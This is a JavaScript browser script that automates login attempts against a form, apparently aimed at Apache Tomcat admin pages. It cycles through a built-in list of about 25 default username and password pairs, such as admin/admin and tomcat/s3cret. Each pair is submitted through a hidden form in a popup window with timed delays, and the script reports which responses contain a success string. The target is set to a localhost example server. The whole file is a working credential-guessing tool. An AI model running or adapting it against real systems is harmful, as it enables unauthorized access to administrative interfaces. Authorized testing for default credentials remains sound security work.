// An array of default credentials for various Apache admin pages
const inputs = [
    {
        'j_username': 'admin',
        'j_password': 'password'
    },
    {
        'j_username': 'admin',
        'j_password': ''
    },
    {
        'j_username': 'admin',
        'j_password': 'Password1'
    },
    {
        'j_username': 'admin',
        'j_password': 'password1'
    },
    {
        'j_username': 'admin',
        'j_password': 'admin'
    },
    {
        'j_username': 'admin',
        'j_password': 'tomcat'
    },
    {
        'j_username': 'both',
        'j_password': 'tomcat'
    },
    {
        'j_username': 'manager',
        'j_password': 'manager'
    },
    {
        'j_username': 'role1',
        'j_password': 'role1'
    },
    {
        'j_username': 'role1',
        'j_password': 'tomcat'
    },
    {
        'j_username': 'role',
        'j_password': 'changethis'
    },
    {
        'j_username': 'root',
        'j_password': 'Password1'
    },
    {
        'j_username': 'root',
        'j_password': 'changethis'
    },
    {
        'j_username': 'root',
        'j_password': 'password'
    },
    {
        'j_username': 'root',
        'j_password': 'password1'
    },
    {
        'j_username': 'root',
        'j_password': 'r00t'
    },
    {
        'j_username': 'root',
        'j_password': 'root'
    },
    {
        'j_username': 'root',
        'j_password': 'toor'
    },
    {
        'j_username': 'tomcat',
        'j_password': 'tomcat'
    },
    {
        'j_username': 'tomcat',
        'j_password': 's3cret'
    },
    {
        'j_username': 'tomcat',
        'j_password': 'password1'
    },
    {
        'j_username': 'tomcat',
        'j_password': 'password'
    },
    {
        'j_username': 'tomcat',
        'j_password': ''
    },
    {
        'j_username': 'tomcat',
        'j_password': 'admin'
    },
    {
        'j_username': 'tomcat',
        'j_password': 'changethis'
    }
];
const parameterNames = [ 'j_username', 'j_password' ]; // the names of the form element
const action = 'http://localhost:3000/da_example_server.php'; // page to send to the form data tos
const method = 'POST'; // http method used
const interval = 3000; // wait 3 seconds between requests
const timeout = 1000; // give the form 1 second to load
const successText = 'Success!';

/**
 * Checks the responses stored in the acc for the presence of successText and prints
 * a JSON array containing the HTML responses that contain it and the associated
 * inputs which generated them.
 * 
 * @param {*} acc 
 * @param {*} successText 
 */
function processor(successText, acc) {
    const successes = acc.filter(elm => elm.response.document.documentElement.outerHTML.indexOf(successText) !== -1)
        .map(elm => elm.inputs);

    // log results to console
    if (successes.length === 0) {
        console.log('None of the provided inputs produced a successful result.');
        return;
    }
    console.log('The following attempts were successful:');
    console.log(JSON.stringify(successes, null, 4));
}

// create a bound form of the processor with the successText bound since it used in all calls
resultProcessor = processor.bind(null, successText);

function automateFormAttempts(
    inputs,
    parameterNames,
    action,
    method = 'POST',
    processor = (acc) => { console.log(JSON.stringify(acc, null, 4)) },
    interval = 0,
    responseTimeout = 1000
) {
    // styling for the windows created
    const windowSize = 'status=0,title=0,height=600,width=800,scrollbars=1';
    
    // accumulator to store results in
    const acc = [];

    // helper to add input data to form a element
    function appendFormData(input, elementName, form) {
        const formElement = document.createElement('input');
        formElement.type = 'text';
        formElement.name = elementName;
        formElement.value = input;
        form.appendChild(formElement);
    }

    // attempt all provided inputs
    inputs.forEach((input, idx)  => {
        // nest inside a timeout to impose delay between requests
        setTimeout(() => {
            // build window and form
            const windowName = `window${idx}`;
            const attemptForm = document.createElement('form');
            attemptForm.style = 'display: none;'
            attemptForm.target = windowName;
            attemptForm.method = method;
            attemptForm.action = action;
            parameterNames.forEach(selector => appendFormData(input[selector], selector, attemptForm));
            document.body.appendChild(attemptForm);
            const attempt = window.open('', windowName, windowSize);
            
            // submit form to window
            if (attempt) attemptForm.submit();

            // wait for the specified responseTimeout and add to the acc
            setTimeout(() => {
                acc[idx] = {
                    inputs: input,
                    response: attempt,
                };

                // process the results in the accumulator
                if (idx === inputs.length - 1) {
                    processor(acc);
                }
            }, responseTimeout);
        }, idx * interval)
    });
}

automateFormAttempts(inputs, parameterNames, action, method, resultProcessor, interval, timeout);
